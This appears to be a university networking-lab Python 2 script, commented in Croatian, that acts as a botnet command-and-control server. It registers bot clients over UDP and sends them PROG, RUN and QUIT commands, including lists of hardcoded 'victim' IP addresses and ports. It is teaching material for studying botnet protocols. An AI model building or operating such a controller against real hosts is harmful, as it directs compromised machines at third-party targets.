#! /usr/bin/env python
'''Command & Control server za LAB1 iz MrePro
   Slusa na PORTUDP i prima registracije od Bot klijenata (poruka REG).
   Na STDIN prima naredbe: r, r2, l, p, q i h
'''

import socket
import sys
import select
import subprocess

PORTUDP = 5555

# UDP_server
UDP_ip = "127.0.0.1"
UDP_port = "1234"
PROG = "0 " + UDP_ip + " " + UDP_port

botovi = set()

def adrese():
    string = "1 "
    string2 = "1"
    portovi = ["5678", "6789", "prosharerequest", "2222", "3333", "5555"]

    izlaz = subprocess.check_output("ifconfig -au inet", shell=True).split('\n')
    i=0
    for red in izlaz:
        if '\tinet' in red:
            inet = red.split()
            #if len(string) > 0:
            #    string = string + ";" 
            string = string + inet[1] + " " + portovi[i] + " "
            string2 = string2 + inet[1] + "\0" * (16-len(inet[1])) + portovi[i] + "\0" * (22-len(portovi[i]))
	    i += 1
    return (string,string2)

(POPIS,POPIS_send) = adrese()

# zrtve
IPS = "20.0.0.11 20.0.0.12 20.0.0.13".split(' ')
PORTS = "1111 2222 3333".split(' ')

vals = []
for i in range(0, len(IPS)):
    tup = (IPS[i], PORTS[i])
    vals.append(tup)

POPIS2 = "1 "
POPIS2_send = "1"

for (ip, port) in vals:
    POPIS2 = POPIS2 + ip + " " + port + " "
    POPIS2_send = POPIS2_send + ip + "\0" * (16-len(ip)) + port + "\0" * (22-len(port))

def help():
    print "Podrzane su naredbe:"
    print "p ... Bot klijentima ssalje poruku PROG"
    print "      struct MSG:" + PROG
    print "r ... Bot klijentima ssalje poruku RUN s adresama iz ifconfig"
    print "      struct MSG:" + POPIS
    print "r2... Bot klijentima ssalje poruku RUN s nekim adresama"
    print "      struct MSG:" + POPIS2
    print "l ... lokalni ispis adresa bot klijenata"
    print "n ... salje poruku: NEPOZNATA"
    print "q ... zavrsetak rada programa"
    print "h ... ispis naredbi"

def naredbe(udp_sock):
    """Ucitaj i obradi naredbe sa stdin
    """
    naredba = sys.stdin.readline()
    if naredba == "r\n":
        print "--> RUN"
        for (adresa, port) in botovi:
            print "%s:%d <--- RUN: %s" % (adresa, port, POPIS)
	    leng = udp_sock.sendto(POPIS_send, (adresa, port))
    elif naredba == "l\n":
        print "--> lista botova:"
        for (adresa, port) in botovi:
              print "%s:%s;" % (adresa, port),
        print ""
    elif naredba == "r2\n":
        print "--> RUN2"
        for (adresa, port) in botovi:
            print "%s:%d <--- RUN: %s" % (adresa, port, POPIS2)
	    leng = udp_sock.sendto(POPIS2_send, (adresa, port))
    elif naredba == "p\n":
        print "--> PROG"
        for (adresa, port) in botovi:
	    print "%s:%d <--- PROG: %s" % (adresa, port, PROG)
	    prog = PROG.split(' ')
	    leng = udp_sock.sendto(prog[0] + prog[1] + "\0" * (16-len(prog[1])) + prog[2] + "\0" * (22-len(prog[2])), (adresa, port))
    elif naredba == "n\n":
        print "--> NEPOZNATA"
        for (adresa, port) in botovi:
            print "%s:%d <-- NEPOZNATA" % (adresa, port)
            leng = udp_sock.sendto("NEPOZNATA", (adresa, port))
    elif naredba == "q\n":
        print "--> QUIT"
        for (adresa, port) in botovi:
            print "%s:%d <--- QUIT" % (adresa, port)
	    leng = udp_sock.sendto('2', (adresa, port))
        print "Kraj programa."
        sys.exit(0)
    elif naredba == "h\n":
        help()
    else:
        print "Nepoznata naredba: %s" % naredba
        help()

#####
# __main__
#
def main():
    """Glavni"""
    udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp_sock.bind(('', PORTUDP))

    inputs = [udp_sock, sys.stdin]

    while True:

        print 'C&C> ',
        sys.stdout.flush()
        readable, writable, exceptional = select.select(inputs, [], inputs)

        for s in readable:

            # Naredba na stdin:
            if s is sys.stdin:
                naredbe(udp_sock)

            # Novi UDP klijent / Bot
            elif s is udp_sock:
                data, (novi_klijent, novi_port) = udp_sock.recvfrom(4096)
                if data == "REG\n":
                    print "\nBot klijent %s:%d" % (novi_klijent, novi_port)
                    botovi.add((novi_klijent, novi_port))
		    # print "Botovi: ", botovi
                else:
                    print "\nBot klijent treba poslati naredbu: REG"

            else:
                print "\nZaboravio sam na fd: ", s
                sys.exit(1)

if __name__ == "__main__":
    main()
